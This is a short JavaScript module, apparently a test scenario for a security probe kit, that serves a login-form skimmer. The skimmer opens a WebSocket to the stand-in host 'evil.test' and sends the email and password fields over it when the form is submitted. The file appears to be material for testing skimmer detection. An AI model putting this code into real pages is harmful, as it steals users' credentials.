// A skimmer that opens a WebSocket at load and sends the credentials over it on submit.
import { scenario } from './probe-kit.js';

export const respond = scenario((ctx) => `var ws = new WebSocket('ws://evil.test:${ctx.origin('evil.test').split(':').pop()}/ws');
document.getElementById('login').addEventListener('submit', function () {
  ws.send(JSON.stringify({ e: document.getElementById('email').value, p: document.getElementById('password').value }));
});`);
